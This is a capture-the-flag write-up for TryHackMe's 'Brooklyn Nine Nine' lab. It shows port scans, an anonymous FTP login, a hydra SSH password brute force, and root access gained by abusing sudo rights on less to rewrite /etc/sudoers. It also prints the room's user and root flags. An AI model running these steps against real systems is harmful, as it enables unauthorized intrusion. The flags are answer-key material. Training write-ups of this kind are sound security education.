## Index

1. [Setup](#setup)
2. [Reconnaissance](#reconnaissance)
3. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using `openvpn` to connect to the server. Here's the command:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

Some quick port scans show us the following stuff:
```shell-session
$ rustscan -b 4500 -a TARGET_IP -r 1-65535 --ulimit 5000 -t 2000 -- -oN rustscan_port_scan.txt
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

$ rustscan -b 4500 -a TARGET_IP -p21,22,80 --ulimit 5000 -t 2000 -- -sV -oN rustscan_service_scan.txt
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Logging into the `ftp` service using an anonymous login, we can get a file: `note_to_jake.txt` which contains the following content:
```txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Upon inspecting the `http` web page from port 80 using a browser, we see a comment: ` Have you ever heard of steganography? ` Which probably means that the image on the web page has some information we can use. But there's nothing interesting found when we inspect it using `exiftool`, `binwalk` and `strings`. Let's try to brute force the `ssh` service on port 22 for the user `jake` (since we know that their password is weak):
```shell-session
$ hydra -v -l jake -P /usr/share/seclists/Passwords/rockyou.txt TARGET_IP ssh 
...
[22][ssh] host: TARGET_IP   login: jake   password: 987654321
```

Bingo! Now we have initial access... we can log into the ssh service using these credentials and then work on privesc:

## Exploitation

Let's log into the ssh service and then see what we can find:
```shell-session
$ ssh jake@TARGET_IP 
jake@TARGET_IP's password: 987654321

jake@brookly_nine_nine:~$ cd /home
jake@brookly_nine_nine:/home$ ls
amy  holt  jake

jake@brookly_nine_nine:/home$ ls amy
jake@brookly_nine_nine:/home$ ls holt
nano.save  user.txt

jake@brookly_nine_nine:/home$ cd holt
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt

jake@brookly_nine_nine:/home/holt$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee

```


> User flag
> 
> Answer: `ee11cbb19052e40b07aac0ca060c23ee`

Now, onto privilege escalation:
```shell-session
## System/OS Info:
jake@brookly_nine_nine:/home/holt$ uname -a
Linux brookly_nine_nine 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

jake@brookly_nine_nine:/home/holt$ cat /etc/issue
Ubuntu 18.04.4 LTS \n \l


## See what binaries are SUID
jake@brookly_nine_nine:~$ find / -perm /u=s,g=s 2>/dev/null
/sbin/pam_extrausers_chkpwd
/sbin/unix_chkpwd
...
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/expiry
/usr/bin/chage
/usr/bin/ssh-agent
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/wall
/usr/bin/chsh
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/mlocate
/usr/bin/passwd
...
/bin/mount
/bin/su
/bin/ping
/bin/fusermount
/bin/less
/bin/umount
/var/mail
/var/local
/var/log/journal
/var/log/journal/a964c6c103ca4788b34450603b8a2ccd


## See what sudo permissions jake has:
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Nice! We can run `less` as root and get the root flag by doing: `sudo less /root/root.txt`, but that'd be a bit too easy... Let's get jake some root privileges!
```shell-session
jake@brookly_nine_nine:~$ sudo less /etc/sudoers
!nano /etc/sudoers
# Now change jake's permissions:
[-] jake    ALL=(ALL) NOPASSWD: /usr/bin/less
[+] jake    ALL=(ALL) NOPASSWD:ALL

jake@brookly_nine_nine:~# sudo bash

root@brookly_nine_nine:~# cd /root
root@brookly_nine_nine:/root# ls
root.txt
root@brookly_nine_nine:/root# cat root.txt 
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

Done!
 > Root flag
 > 
 > Answer: `63a9f0ea7bb98050796b649e85481845`


## Conclusion
If this writeup helps, please consider following me on github (https://github.com/NovusEdge) and/or dropping a star on the repository: https://github.com/NovusEdge/thm-writeups

---

- Author: Aliasgar Khimani
- Room: [Brooklyn Nine Nine by Fsociety2006](https://tryhackme.com/room/brooklynninenine)
